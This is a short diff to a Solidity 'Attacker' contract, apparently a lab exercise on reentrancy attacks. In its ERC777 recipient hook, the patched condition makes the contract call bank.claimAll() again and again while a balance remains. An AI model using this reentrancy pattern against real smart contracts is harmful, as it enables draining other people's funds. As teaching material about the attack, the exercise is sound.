@@ -62,7 +62,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-		if (from.balance > 0 ) {
+		if (address(from).balance > 0 ) {
             		bank.claimAll();
         }
 	}
